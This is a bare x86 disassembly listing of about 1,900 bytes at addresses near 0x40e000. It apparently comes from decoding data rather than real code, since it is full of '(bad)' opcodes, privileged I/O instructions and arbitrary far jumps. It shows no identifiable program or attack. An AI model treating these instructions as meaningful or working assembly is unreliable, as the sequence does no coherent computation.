  40e122:	push   ebp
  40e123:	mov    BYTE PTR [ebx-0x6],bl
  40e126:	outs   dx,DWORD PTR ds:[esi]
  40e127:	bound  ebx,QWORD PTR [edi+0x5930dff6]
  40e12d:	enter  0xbb48,0xde
  40e131:	and    DWORD PTR [eax+ecx*2+0x7c],edi
  40e135:	hlt    
  40e136:	lods   eax,DWORD PTR ds:[esi]
  40e137:	push   es
  40e138:	lods   eax,DWORD PTR ds:[esi]
  40e139:	(bad)  [ebp-0x504f373]
  40e13f:	test   eax,0xfa5a8a94
  40e144:	cdq    
  40e145:	or     al,0xfc
  40e147:	adc    al,dh
  40e149:	(bad)  
  40e14a:	sar    BYTE PTR [edi+0x77],cl
  40e14d:	xchg   esi,eax
  40e14e:	aad    0x19
  40e150:	ret    0xc93e
  40e153:	inc    edi
  40e154:	adc    cl,BYTE PTR [edi+0x13d208ab]
  40e15a:	xchg   edx,eax
  40e15b:	mov    al,ds:0x256a8371
  40e160:	jge    0x40e11a
  40e162:	inc    ecx
  40e163:	ror    BYTE PTR [edi+eax*4-0x7ddfa1b6],0x6b
  40e16b:	push   cs
  40e16c:	clc    
  40e16d:	icebp  
  40e16e:	ja     0x40e1eb
  40e170:	fdivrp st(1),st
  40e172:	lods   al,BYTE PTR ds:[esi]
  40e173:	aad    0x98
  40e175:	aad    0xb4
  40e177:	mov    esi,0xcbfa9ebe
  40e17c:	or     ah,BYTE PTR [ebx]
  40e17e:	or     eax,0xa760c11f
  40e183:	or     DWORD PTR [esi-0x70e8353],edi
  40e189:	std    
  40e18a:	fwait
  40e18b:	mov    al,ds:0xfa06c001
  40e190:	dec    ecx
  40e191:	fild   QWORD PTR [edi-0x13]
  40e194:	pop    ebx
  40e195:	jbe    0x40e146
  40e197:	aaa    
  40e198:	adc    dh,BYTE PTR [edx]
  40e19a:	jmp    0x40e1f7
  40e19c:	cmc    
  40e19d:	int3   
  40e19e:	outs   dx,BYTE PTR ds:[esi]
  40e19f:	call   0x736e:0x43511b92
  40e1a6:	jl     0x40e1be
  40e1a8:	pushf  
  40e1a9:	gs inc edi
  40e1ab:	rcr    DWORD PTR [ebp+0x50],cl
  40e1ae:	mov    bl,0x2
  40e1b0:	sub    dl,BYTE PTR [ecx-0x2c757f7a]
  40e1b6:	pop    ds
  40e1b7:	enter  0x28b,0x85
  40e1bb:	in     eax,0x81
  40e1bd:	ss (bad) 
  40e1bf:	jmp    0x88fecb77
  40e1c4:	or     eax,0x9958495f
  40e1c9:	daa    
  40e1ca:	scas   al,BYTE PTR es:[edi]
  40e1cb:	inc    ebp
  40e1cc:	push   es
  40e1cd:	mov    ds:0xf251584f,eax
  40e1d2:	adc    DWORD PTR [edi-0x3e],ebx
  40e1d5:	jmp    0xdd1a:0x66135f66
  40e1dc:	mov    al,ds:0x4d95d0ab
  40e1e1:	add    edi,DWORD PTR [ecx+0x46f2c343]
  40e1e7:	adc    DWORD PTR [ecx+0x982c84e],0x59
  40e1ee:	and    bl,BYTE PTR [ecx+0x6b]
  40e1f1:	sub    ebx,ecx
  40e1f3:	xlat   BYTE PTR ds:[ebx]
  40e1f4:	ds cdq 
  40e1f6:	dec    eax
  40e1f7:	jle    0x40e1ee
  40e1f9:	es or  esi,ecx
  40e1fc:	add    al,0x68
  40e1fe:	imul   esp,DWORD PTR [esi+edi*1-0x78],0xffffff91
  40e203:	outs   dx,DWORD PTR ds:[esi]
  40e204:	ds test eax,0x98718c03
  40e20a:	sbb    eax,0x1196190f
  40e20f:	add    al,0x50
  40e211:	(bad)  ds:[edx+0x52a3fe03]
  40e218:	daa    
  40e219:	icebp  
  40e21a:	jecxz  0x40e236
  40e21c:	push   ds
  40e21d:	(bad)  
  40e21e:	(bad)  
  40e220:	mov    cl,0x53
  40e222:	cmp    al,0x78
  40e224:	js     0x40e247
  40e226:	leave  
  40e227:	inc    edx
  40e228:	iret   
  40e229:	icebp  
  40e22a:	(bad)  
  40e22b:	mov    dh,0xd2
  40e22d:	add    BYTE PTR [ebx],dl
  40e22f:	stos   DWORD PTR es:[edi],eax
  40e230:	popf   
  40e231:	cli    
  40e232:	xchg   edi,eax
  40e233:	lock in eax,dx
  40e235:	xor    esi,DWORD PTR [ecx-0x7dfbb4f0]
  40e23b:	ja     0x40e1eb
  40e23d:	jg     0x40e299
  40e23f:	cmp    cl,ah
  40e241:	(bad)  
  40e242:	pop    esp
  40e243:	add    al,0x8e
  40e245:	pop    ebp
  40e246:	adc    al,0xad
  40e248:	inc    ebx
  40e249:	imul   edx,DWORD PTR [edx+eiz*2-0x4d69ca5d],0x2f145d27
  40e254:	xchg   ebp,eax
  40e255:	dec    esp
  40e256:	push   esp
  40e257:	rol    DWORD PTR [eax-0x43bcf161],1
  40e25d:	push   ebx
  40e25e:	pop    eax
  40e25f:	lock int 0xba
  40e262:	dec    ecx
  40e263:	mov    edx,0x6ee103f1
  40e268:	push   0xffffffdd
  40e26a:	jne    0x40e255
  40e26c:	fild   DWORD PTR [ecx-0x3b998d9b]
  40e272:	mov    ebp,0x1f20bb8b
  40e277:	inc    BYTE PTR [edx-0x9]
  40e27a:	ret    0x9234
  40e27d:	outs   dx,DWORD PTR ds:[esi]
  40e27e:	test   DWORD PTR ds:0xd21ec7e9,ebx
  40e284:	add    ah,0x4e
  40e287:	inc    ebp
  40e288:	jb     0x40e235
  40e28a:	pop    ecx
  40e28b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e28c:	add    eax,0x351ac0ff
  40e291:	push   es
  40e292:	ins    BYTE PTR es:[edi],dx
  40e293:	ja     0x40e2b3
  40e295:	jmp    0xe2c2e323
  40e29a:	out    0xe2,eax
  40e29c:	add    BYTE PTR [ebx],ch
  40e29e:	dec    ebp
  40e29f:	inc    edx
  40e2a0:	loope  0x40e23b
  40e2a2:	fidiv  WORD PTR [ecx+edi*8]
  40e2a5:	jne    0x40e25e
  40e2a7:	adc    eax,0x31461f7a
  40e2ac:	xchg   edi,eax
  40e2ad:	or     ebx,0x70df9518
  40e2b3:	aas    
  40e2b4:	ja     0x40e30b
  40e2b6:	call   0x4002f267
  40e2bb:	cli    
  40e2bc:	xchg   edx,eax
  40e2bd:	nop
  40e2be:	repnz xor al,0x49
  40e2c1:	out    0x6b,al
  40e2c3:	mov    al,0x9b
  40e2c5:	xlat   BYTE PTR ds:[ebx]
  40e2c6:	dec    ebp
  40e2c7:	mov    bh,0xc3
  40e2c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2ca:	adc    BYTE PTR [eax],ch
  40e2cc:	out    0xc5,al
  40e2ce:	(bad)  
  40e2cf:	in     al,dx
  40e2d0:	jb     0x40e2c1
  40e2d2:	addr16 cmp al,0x3b
  40e2d5:	nop
  40e2d6:	inc    eax
  40e2d7:	call   0xd829:0x6a9025b5
  40e2de:	cmp    DWORD PTR [ebx],esp
  40e2e0:	out    0xcf,al
  40e2e2:	and    eax,0x3ff80e8d
  40e2e7:	jae    0x40e357
  40e2e9:	dec    edx
  40e2ea:	or     ah,BYTE PTR [edi]
  40e2ec:	aas    
  40e2ed:	xchg   DWORD PTR [ecx],esi
  40e2ef:	call   0x1948b63a
  40e2f4:	sub    DWORD PTR [ecx-0x79514a57],eax
  40e2fa:	ret    0xdf75
  40e2fd:	xchg   edi,eax
  40e2fe:	call   0x109:0x9099fe89
  40e305:	neg    DWORD PTR [edx-0x7f9b6f5f]
  40e30b:	mov    ds:0xa2487e11,al
  40e310:	test   eax,ebp
  40e312:	jmp    0x93ad:0xaf9cb73c
  40e319:	cld    
  40e31a:	push   ds
  40e31b:	push   edi
  40e31c:	outs   dx,BYTE PTR ds:[esi]
  40e31d:	jno    0x40e371
  40e31f:	lods   al,BYTE PTR ds:[esi]
  40e320:	jg     0x40e2f8
  40e322:	mov    ch,bh
  40e324:	scas   eax,DWORD PTR es:[edi]
  40e325:	leave  
  40e326:	clc    
  40e327:	cmp    esp,DWORD PTR [ecx+0xb]
  40e32a:	push   ss
  40e32b:	dec    esi
  40e32c:	adc    al,0xef
  40e32e:	lea    esp,[edi+0x6958503f]
  40e334:	mov    al,ds:0xd4f89709
  40e339:	(bad)  
  40e33a:	fwait
  40e33b:	retf   0xe93e
  40e33e:	push   edi
  40e33f:	das    
  40e340:	addr16 or esp,edx
  40e343:	pop    esi
  40e344:	sbb    al,0x71
  40e346:	into   
  40e347:	inc    edi
  40e348:	xchg   esi,eax
  40e349:	mov    ch,0xb3
  40e34b:	js     0x40e2e7
  40e34d:	bound  ebx,QWORD PTR [eax+0x17cacefc]
  40e353:	stc    
  40e354:	test   eax,0x8c523bdd
  40e359:	jo     0x40e39c
  40e35b:	dec    edx
  40e35c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e35d:	(bad)  
  40e35f:	pop    ebp
  40e360:	inc    eax
  40e361:	push   es
  40e362:	imul   edi,edx,0xffffff9d
  40e365:	stos   BYTE PTR es:[edi],al
  40e366:	stc    
  40e367:	rol    esi,1
  40e369:	jmp    0xc4dc59ed
  40e36e:	imul   edi,ebp,0x3e
  40e371:	push   ecx
  40e372:	stc    
  40e373:	adc    al,0x82
  40e375:	clc    
  40e376:	aas    
  40e377:	sub    bl,BYTE PTR [edi-0x3c6fe659]
  40e37d:	xor    al,0x40
  40e37f:	or     DWORD PTR [ebx-0x54],0x923f49cd
  40e386:	clc    
  40e387:	fmul   QWORD PTR [ebx]
  40e389:	mov    ebx,0x29567221
  40e38e:	push   eax
  40e38f:	inc    ebp
  40e390:	in     al,dx
  40e391:	xor    esp,DWORD PTR [edi]
  40e393:	mov    dl,BYTE PTR [esi-0x61]
  40e396:	shl    DWORD PTR [esi],1
  40e398:	mov    eax,DWORD PTR [edx+esi*4-0x3954746a]
  40e39f:	shl    ah,0xdd
  40e3a2:	cmc    
  40e3a3:	mov    al,0x6f
  40e3a5:	mov    esi,DWORD PTR [edx]
  40e3a7:	and    BYTE PTR [ecx+0x6bf8963c],ch
  40e3ad:	out    0xe8,al
  40e3af:	retf   
  40e3b0:	aam    0x53
  40e3b2:	ss pop ebx
  40e3b4:	ja     0x40e353
  40e3b6:	and    bl,dh
  40e3b8:	into   
  40e3b9:	inc    edx
  40e3ba:	loope  0x40e355
  40e3bc:	stos   DWORD PTR es:[edi],eax
  40e3bd:	jmp    0x40e3f8
  40e3bf:	mov    ch,0xd0
  40e3c1:	out    dx,eax
  40e3c2:	mov    al,0x18
  40e3c4:	mov    WORD PTR [edi+ebp*4+0x1c],fs
  40e3c8:	in     al,dx
  40e3c9:	jo     0x40e371
  40e3cb:	sbb    DWORD PTR [esi],0xffffff87
  40e3ce:	in     eax,0xb7
  40e3d0:	fwait
  40e3d1:	push   ebp
  40e3d2:	adc    eax,0x53be8d01
  40e3d7:	cmp    esi,DWORD PTR [ebx]
  40e3d9:	fsub   QWORD PTR [esi-0xd]
  40e3dc:	dec    esi
  40e3dd:	into   
  40e3de:	inc    edx
  40e3df:	xor    BYTE PTR [edx+0x26],bh
  40e3e2:	repnz sbb DWORD PTR [ebx],edx
  40e3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3e6:	hlt    
  40e3e7:	push   0x1e
  40e3e9:	or     ch,BYTE PTR [ecx+0x530910d2]
  40e3ef:	sub    BYTE PTR [ebp+0x6b],bh
  40e3f2:	rep outs dx,DWORD PTR gs:[esi]
  40e3f5:	adc    esi,DWORD PTR [esi+0x493933b8]
  40e3fb:	push   esi
  40e3fc:	sbb    bl,0x24
  40e3ff:	(bad)
  40e402:	mov    dl,0x2b
  40e404:	int    0xa
  40e406:	jge    0x40e3cb
  40e408:	xor    ah,BYTE PTR [edi-0x609a0f7d]
  40e40e:	outs   dx,DWORD PTR ds:[esi]
  40e40f:	mov    eax,0xd990c55b
  40e414:	push   0x555f6dde
  40e419:	daa    
  40e41a:	push   ebp
  40e41b:	out    dx,al
  40e41c:	into   
  40e41d:	pop    es
  40e41e:	xchg   esi,eax
  40e41f:	jmp    0x40e428
  40e421:	dec    esp
  40e422:	xchg   esi,eax
  40e423:	jp     0x40e424
  40e425:	mov    ebx,0x2409ba02
  40e42a:	cmp    DWORD PTR [esi],ebx
  40e42c:	or     DWORD PTR [ebp-0x3473b6ee],ebp
  40e432:	iret   
  40e433:	(bad)  
  40e434:	sbb    al,0x9f
  40e436:	fnsave [ebx]
  40e438:	sahf   
  40e439:	or     al,0xbc
  40e43b:	inc    edi
  40e43c:	pop    eax
  40e43d:	pop    esp
  40e43e:	lods   al,BYTE PTR ds:[esi]
  40e43f:	xor    edi,DWORD PTR [eax+0x419ee067]
  40e445:	rcl    DWORD PTR [ebp-0x615d1ba5],0xc1
  40e44c:	xor    esp,DWORD PTR [edx+ebp*4]
  40e44f:	sub    BYTE PTR [edi-0x3d6cbf6f],cl
  40e455:	(bad)  
  40e456:	adc    esi,DWORD PTR [edi-0x6d9da3ba]
  40e45c:	jmp    0xbeb0:0xef809bcd
  40e463:	xor    al,0xde
  40e465:	neg    BYTE PTR [esi]
  40e467:	push   cs
  40e468:	shl    DWORD PTR [edx],cl
  40e46a:	xchg   esp,eax
  40e46b:	add    BYTE PTR [ebx-0x5dc3f8e1],0x95
  40e472:	call   0x8a4d501e
  40e477:	jmp    0x1536:0xc505a229
  40e47e:	ds aaa 
  40e480:	shr    BYTE PTR [edi+edi*2],cl
  40e483:	push   edx
  40e484:	lds    ebx,FWORD PTR [eax]
  40e486:	sahf   
  40e487:	ins    BYTE PTR es:[edi],dx
  40e488:	ins    DWORD PTR es:[edi],dx
  40e489:	add    ecx,DWORD PTR [edx-0x4fee94da]
  40e48f:	xchg   ebx,eax
  40e490:	mov    dh,0xad
  40e492:	push   edi
  40e493:	in     eax,dx
  40e494:	and    BYTE PTR [ebx],dh
  40e496:	or     al,0x63
  40e498:	adc    bh,BYTE PTR ds:0x5f5c80af
  40e49e:	sub    ebp,0xcbbdec20
  40e4a4:	ins    BYTE PTR es:[edi],dx
  40e4a5:	push   eax
  40e4a6:	idiv   DWORD PTR [ecx-0x4a098684]
  40e4ac:	ret    
  40e4ad:	xor    BYTE PTR [ecx-0x67],ch
  40e4b0:	inc    esp
  40e4b1:	and    al,0x18
  40e4b3:	push   eax
  40e4b4:	fst    QWORD PTR [esi+0x34152dc7]
  40e4ba:	inc    edi
  40e4bb:	xchg   esi,eax
  40e4bc:	jo     0x40e512
  40e4be:	mov    edi,0x4152d14b
  40e4c3:	icebp  
  40e4c4:	das    
  40e4c5:	xchg   esi,eax
  40e4c6:	arpl   bx,ax
  40e4c8:	xor    al,0x4f
  40e4ca:	pop    eax
  40e4cb:	test   bh,cl
  40e4cd:	pop    ecx
  40e4ce:	sub    esi,DWORD PTR [edi+0x30]
  40e4d1:	push   esp
  40e4d2:	lock shl DWORD PTR [ebp-0x15],cl
  40e4d6:	aas    
  40e4d7:	sub    al,0xf0
  40e4d9:	and    BYTE PTR [ebx+eax*8-0x6552bd70],bl
  40e4e0:	xchg   DWORD PTR [eax-0x44d243d2],ebp
  40e4e6:	sub    ebp,ecx
  40e4e8:	jmp    0x40e4c7
  40e4ea:	and    dh,cl
  40e4ec:	jne    0x40e566
  40e4ee:	adc    al,0xc2
  40e4f0:	test   eax,0xa51c59bd
  40e4f5:	int3   
  40e4f6:	add    bl,BYTE PTR [eax]
  40e4f8:	jne    0x40e4e4
  40e4fa:	not    BYTE PTR [ebp-0x10bedb58]
  40e500:	lea    edi,[esi-0x7a]
  40e503:	ret    
  40e504:	lahf   
  40e505:	popf   
  40e506:	(bad)  
  40e507:	repz pop edi
  40e509:	or     eax,0xd169112a
  40e50e:	cld    
  40e50f:	test   BYTE PTR [esp+edx*1-0x5b9d4548],dl
  40e516:	add    BYTE PTR [edi],cl
  40e518:	rcl    DWORD PTR [edi+0x23],cl
  40e51b:	fidiv  DWORD PTR [edi-0x476b89ba]
  40e521:	dec    esp
  40e522:	ret    0xb340
  40e525:	shl    cl,1
  40e527:	(bad)  
  40e528:	jmp    0xacaa:0xfe4ca76e
  40e52f:	or     eax,0x71e746c3
  40e534:	dec    edx
  40e535:	mov    dl,0xe4
  40e537:	rol    BYTE PTR [edx-0x5e],cl
  40e53a:	xchg   esi,eax
  40e53b:	out    0x84,al
  40e53d:	jae    0x40e4d2
  40e53f:	(bad)  
  40e541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e542:	(bad)  
  40e543:	popa   
  40e544:	jge    0x40e51c
  40e546:	mov    esi,0xb94746e8
  40e54b:	dec    ebx
  40e54c:	inc    eax
  40e54d:	sub    BYTE PTR ds:0xf7c7172f,al
  40e553:	int    0x8f
  40e555:	rcr    ebp,0x34
  40e558:	scas   al,BYTE PTR es:[edi]
  40e559:	sti    
  40e55a:	fst    DWORD PTR [edi]
  40e55c:	dec    edx
  40e55d:	and    dl,cl
  40e55f:	out    dx,al
  40e560:	jb     0x40e525
  40e562:	cmp    ch,BYTE PTR [ebx-0xc]
  40e565:	mov    eax,0xbeb675f5
  40e56a:	shl    BYTE PTR [ebx],0x2e
  40e56d:	push   cs
  40e56e:	add    eax,0x51e43aeb
  40e573:	lods   eax,DWORD PTR ds:[esi]
  40e574:	jg     0x40e522
  40e576:	scas   eax,DWORD PTR es:[edi]
  40e577:	pop    ds
  40e578:	or     esp,edx
  40e57a:	mov    ds:0xbb76be8f,eax
  40e57f:	push   esp
  40e580:	ret    0x31dd
  40e583:	lock mov edx,0xa25efb42
  40e589:	sub    eax,0xeb080cff
  40e58e:	leave  
  40e58f:	pop    ecx
  40e590:	int3   
  40e591:	imul   esp,DWORD PTR [ecx],0xfef07a72
  40e597:	and    DWORD PTR [ebp-0x251476f0],ebp
  40e59d:	icebp  
  40e59e:	xor    DWORD PTR [eax],esp
  40e5a0:	pop    esp
  40e5a1:	inc    ebp
  40e5a2:	test   ebx,0x80dc5d71
  40e5a8:	mov    ds:0x728c6164,eax
  40e5ad:	jnp    0x40e5ac
  40e5af:	lods   al,BYTE PTR ds:[esi]
  40e5b0:	mov    al,ds:0xcc5ab25d
  40e5b5:	js     0x40e60c
  40e5b7:	ret    0x7c5b
  40e5ba:	pop    esp
  40e5bb:	or     ch,BYTE PTR [edx]
  40e5bd:	ret    
  40e5be:	ja     0x40e5c2
  40e5c0:	jb     0x40e58c
  40e5c2:	jb     0x40e599
  40e5c4:	pop    ebx
  40e5c5:	inc    esi
  40e5c6:	into   
  40e5c7:	scas   eax,DWORD PTR es:[edi]
  40e5c8:	cmp    esp,edi
  40e5ca:	cmp    al,0xcb
  40e5cc:	shl    BYTE PTR [ebp+0x40e05c29],0xce
  40e5d3:	mov    esp,0x2a43bee4
  40e5d8:	xchg   edx,eax
  40e5d9:	or     eax,0x26bcb2b5
  40e5de:	fdiv   QWORD PTR [edx]
  40e5e0:	fdivr  QWORD PTR [ecx+0x6f]
  40e5e3:	sbb    BYTE PTR [ebp+0x1],ch
  40e5e6:	out    dx,eax
  40e5e7:	mov    eax,0x2608b310
  40e5ec:	or     al,0x4
  40e5ee:	ins    BYTE PTR es:[edi],dx
  40e5ef:	dec    ecx
  40e5f0:	jns    0x40e60b
  40e5f2:	mov    al,0xf6
  40e5f4:	gs pop ss
  40e5f6:	push   ecx
  40e5f7:	dec    esi
  40e5f8:	sbb    DWORD PTR [ecx+0x2af9f8ba],0x43b47665
  40e602:	fbstp  TBYTE PTR [edi-0x55]
  40e605:	pop    edi
  40e606:	cmp    eax,0xa8e3b75
  40e60b:	inc    esi
  40e60c:	idiv   BYTE PTR [edi]
  40e60e:	inc    edx
  40e60f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e610:	clc    
  40e611:	xchg   ebp,eax
  40e612:	cmc    
  40e613:	push   ebp
  40e614:	aad    0x32
  40e616:	cmp    DWORD PTR [ebx],eax
  40e618:	inc    ecx
  40e619:	into   
  40e61a:	mov    al,ds:0x9ad53364
  40e61f:	lea    edi,[eax+0x45]
  40e622:	daa    
  40e623:	adc    bh,BYTE PTR [esi]
  40e625:	cmp    DWORD PTR [ebx+ecx*4],esi
  40e628:	jno    0x40e5b4
  40e62a:	mov    dl,0x78
  40e62c:	lds    esi,FWORD PTR [edi+0x37]
  40e62f:	adc    eax,0xffffff99
  40e632:	mov    cl,0xde
  40e634:	sar    bl,cl
  40e636:	xlat   BYTE PTR ds:[ebx]
  40e637:	mov    cl,BYTE PTR [edi-0x3c]
  40e63a:	pop    ebp
  40e63b:	inc    ecx
  40e63c:	or     BYTE PTR [eax+ebx*2],dh
  40e63f:	enter  0x8cbc,0xca
  40e643:	mov    BYTE PTR [ebx+0x54],ch
  40e646:	cli    
  40e647:	xchg   edi,eax
  40e648:	mov    al,ds:0x55a1b4a7
  40e64d:	ret    0x2ef7
  40e650:	aaa    
  40e651:	sar    edi,1
  40e653:	loop   0x40e669
  40e655:	dec    edi
  40e656:	retf   0x13c7
  40e659:	ja     0x40e67a
  40e65b:	jne    0x40e60d
  40e65d:	xor    ebp,DWORD PTR ds:0x2317df56
  40e663:	mov    ds:0xad76e9cd,al
  40e668:	std    
  40e669:	test   DWORD PTR [eax],esi
  40e66b:	iret   
  40e66c:	pusha  
  40e66d:	rcl    BYTE PTR [edi+0x6d],cl
  40e670:	pop    eax
  40e671:	test   BYTE PTR [edx-0x1e],dh
  40e674:	or     al,0x2c
  40e676:	add    BYTE PTR [edi-0x6f584da1],ah
  40e67c:	jo     0x40e6a3
  40e67e:	sbb    BYTE PTR [esp+ebp*1-0x4885705e],ah
  40e685:	aam    0x5
  40e687:	xor    al,0xe0
  40e689:	pop    DWORD PTR [edx+0x3c]
  40e68c:	cmp    al,0x3d
  40e68e:	pop    ebp
  40e68f:	push   ecx
  40e690:	or     edi,edi
  40e692:	sub    al,0x17
  40e694:	and    BYTE PTR [edi+0x39616ef5],bh
  40e69a:	sbb    eax,DWORD PTR [esi]
  40e69c:	(bad)  
  40e69d:	cmp    eax,0x62756ac7
  40e6a2:	hlt    
  40e6a3:	lock jnp 0x40e66f
  40e6a6:	pop    ds
  40e6a7:	sar    eax,0xc4
  40e6aa:	jle    0x40e6de
  40e6ac:	daa    
  40e6ad:	loop   0x40e6bd
  40e6af:	sub    edi,esi
  40e6b1:	adc    dl,BYTE PTR [edx]
  40e6b3:	add    bh,BYTE PTR [esi-0x5]
  40e6b6:	inc    edx
  40e6b7:	push   ss
  40e6b8:	leave  
  40e6b9:	ja     0x40e657
  40e6bb:	aas    
  40e6bc:	(bad)  
  40e6bd:	adc    dl,ah
  40e6bf:	adc    DWORD PTR [eax],eax
  40e6c1:	or     dl,BYTE PTR [ebx-0x31]
  40e6c4:	mov    ds:0x9f7a57e8,al
  40e6c9:	mov    cl,BYTE PTR [esi+0x517ae842]
  40e6cf:	loope  0x40e69f
  40e6d1:	fdiv   st(0),st
  40e6d3:	stos   BYTE PTR es:[edi],al
  40e6d4:	add    DWORD PTR [ebp+0x1b5e58c0],ebx
  40e6da:	ins    BYTE PTR es:[edi],dx
  40e6db:	mov    eax,ds:0x992a8612
  40e6e0:	xchg   DWORD PTR [ebp+ebx*2+0x78],esp
  40e6e4:	add    DWORD PTR [eax],esp
  40e6e6:	pop    ecx
  40e6e7:	test   BYTE PTR [eax+eiz*8+0xae3c145],al
  40e6ee:	push   ebp
  40e6ef:	dec    eax
  40e6f0:	dec    eax
  40e6f1:	xchg   ebp,eax
  40e6f2:	idiv   BYTE PTR ds:0x50fe6da
  40e6f8:	jg     0x40e6c0
  40e6fa:	test   BYTE PTR [ebx+eiz*4+0x8],cl
  40e6fe:	xlat   BYTE PTR ds:[ebx]
  40e6ff:	or     DWORD PTR [eax+0x1c],edi
  40e702:	in     al,dx
  40e703:	pop    ss
  40e704:	pop    esi
  40e705:	sbb    ah,BYTE PTR [ecx]
  40e707:	and    al,0xf5
  40e709:	push   esp
  40e70a:	cmc    
  40e70b:	sbb    ebp,esp
  40e70d:	mov    ch,0xbd
  40e70f:	sub    al,BYTE PTR [edi-0x43e7c998]
  40e715:	push   esi
  40e716:	cs jmp 0x5fef:0x9424bb72
  40e71e:	gs and bl,ch
  40e721:	dec    ecx
  40e722:	xor    BYTE PTR [eax],dl
  40e724:	xor    ecx,DWORD PTR [ecx+0x4bda95a1]
  40e72a:	push   es
  40e72b:	and    DWORD PTR [eax-0x34],edx
  40e72e:	push   edx
  40e72f:	mov    cl,0xf8
  40e731:	in     eax,dx
  40e732:	jne    0x40e73e
  40e734:	sub    BYTE PTR [ebx+0x43d3a2b8],bl
  40e73a:	mov    bl,0x78
  40e73c:	cmc    
  40e73d:	cdq    
  40e73e:	shl    ebp,0x21
  40e741:	loopne 0x40e7be
  40e743:	fsubr  DWORD PTR [ebp-0x5d]
  40e746:	out    dx,al
  40e747:	ror    DWORD PTR [ebp+0x34],cl
  40e74a:	inc    ebp
  40e74b:	fcom   st(7)
  40e74d:	lods   eax,DWORD PTR ds:[esi]
  40e74e:	mov    ch,0x7d
  40e750:	imul   ecx,DWORD PTR [esi+0x320403ef],0x66ec311
  40e75a:	mov    ds:0x83978f12,al
  40e75f:	jp     0x40e7db
  40e761:	retf   
  40e762:	cmp    eax,0x51e27391
  40e768:	scas   al,BYTE PTR es:[edi]
  40e769:	mov    dh,0x5d
  40e76b:	push   ecx
  40e76c:	inc    eax
  40e76d:	push   es
  40e76e:	xchg   ebp,eax
  40e76f:	pop    ebp
  40e770:	call   0xb2cf:0x8a47bb80
  40e777:	fisubr DWORD PTR [edx]
  40e779:	xor    al,0x55
  40e77b:	ss inc eax
  40e77d:	mov    al,0x12
  40e77f:	sub    eax,0xe712ded
  40e784:	mov    eax,ds:0xa7fcad60
  40e789:	mov    ecx,0x6d0fc553
  40e78e:	shr    DWORD PTR cs:[edx-0x5748a0e3],0xed
  40e796:	mov    WORD PTR [ebp+0x4f],ss
  40e799:	mov    ah,0x57
  40e79b:	jae    0x40e71f
  40e79d:	nop
  40e79e:	stos   BYTE PTR es:[edi],al
  40e79f:	xchg   ebp,eax
  40e7a0:	push   cs
  40e7a1:	sahf   
  40e7a2:	sub    al,0x1b
  40e7a4:	push   ebx
  40e7a5:	out    0x5a,al
  40e7a7:	lea    edi,[edi+0x2c]
  40e7aa:	mov    al,0xf7
  40e7ac:	jge    0x40e824
  40e7ae:	(bad)  
  40e7af:	sub    DWORD PTR [ebp-0x75b22ea8],eax
  40e7b5:	adc    eax,0xa034f83f
  40e7ba:	mov    WORD PTR [edx+ebp*8],ss
  40e7bd:	rcl    BYTE PTR [esi-0xf1cef02],cl
  40e7c3:	addr16 iret 
  40e7c5:	xchg   ebx,eax
  40e7c6:	pop    esi
  40e7c7:	sti    
  40e7c8:	pop    eax
  40e7c9:	mov    ds:0x5d0ce6d1,al
  40e7ce:	iret   
  40e7cf:	adc    eax,0x5f78639d
  40e7d4:	int3   
  40e7d5:	cdq    
  40e7d6:	(bad)  
  40e7d7:	dec    ebp
  40e7d8:	xor    ecx,ebx
  40e7da:	xchg   esi,eax
  40e7db:	shl    DWORD PTR [esi-0x5be5fe48],1
  40e7e1:	sar    BYTE PTR [ecx],0x9a
  40e7e4:	out    0x8,al
  40e7e6:	xchg   edi,eax
  40e7e7:	xor    dl,BYTE PTR [edx]
  40e7e9:	sbb    BYTE PTR [ebx+0x4c],cl
  40e7ec:	call   0xf2750c87
  40e7f1:	mov    eax,0x27a4f321
  40e7f6:	adc    ah,BYTE PTR [esi-0x28]
  40e7f9:	xchg   BYTE PTR [eax-0x3c],cl
  40e7fc:	mov    ah,0x5d
  40e7fe:	bound  esp,QWORD PTR [ebp-0x29]
  40e801:	inc    eax
  40e802:	push   ds
  40e803:	sbb    al,0x2e
  40e805:	enter  0xd763,0x14
  40e809:	and    cl,BYTE PTR [edx-0x2001162c]
  40e80f:	cmp    eax,0xed9d08c
  40e814:	and    cl,al
  40e816:	pslld  mm2,QWORD PTR [eax+0x4ac727d3]
  40e81d:	or     DWORD PTR [ebp-0x77],ecx
  40e820:	rcr    DWORD PTR [ebp+0x2a],1
  40e823:	popf   
  40e824:	mov    bl,0x26
  40e826:	fcmovu st,st(1)
  40e828:	push   edi
  40e829:	int    0x6d
  40e82b:	wrmsr  
  40e82d:	pop    edx
  40e82e:	je     0x40e8a7
  40e830:	pusha  
  40e831:	xchg   esi,eax
  40e832:	iret   
  40e833:	mov    dh,0xe7
  40e835:	xor    DWORD PTR ds:0x24525637,0xffffffdf
  40e83c:	call   0x1c9a2927
  40e841:	jg     0x40e883
  40e843:	fisubr DWORD PTR [eax-0x6b]
  40e846:	jno    0x40e7f8
  40e848:	cmp    al,0x2e
  40e84a:	sub    BYTE PTR [ebx+ebx*8-0x29],dh
  40e84e:	loop   0x40e894
  40e850:	xchg   esi,eax
  40e851:	lods   al,BYTE PTR ds:[esi]
  40e852:	retf   0xf3fb
  40e855:	fwait
  40e856:	add    eax,0x464f2662
  40e85b:	sub    BYTE PTR [ebp+0x11],al
  40e85e:	xchg   ebx,eax
  40e85f:	add    BYTE PTR [edi],dl
  40e861:	neg    BYTE PTR [edi+0x557f96d6]
  40e867:	lods   al,BYTE PTR ds:[esi]
  40e868:	push   ecx
  40e869:	loop   0x40e828
  40e86b:	add    BYTE PTR [ecx],ah
  40e86d:	sahf   
  40e86e:	add    eax,0x3880ab7f
  40e873:	sub    al,0x2b
  40e875:	ja     0x40e853
  40e877:	popa   
  40e878:	mov    dh,0x3e
  40e87a:	xor    eax,0x66aa826b
  40e87f:	and    ecx,ecx
  40e881:	jno    0x40e8a4
  40e883:	outs   dx,DWORD PTR ds:[esi]
  40e884:	repnz shl BYTE PTR [edx],0xd3
  40e888:	dec    ebp
  40e889:	add    edi,DWORD PTR [ecx+ebx*8-0xd4a12b4]
  40e890:	ins    BYTE PTR es:[edi],dx
  40e891:	mov    cs,WORD PTR [ecx+eiz*2]
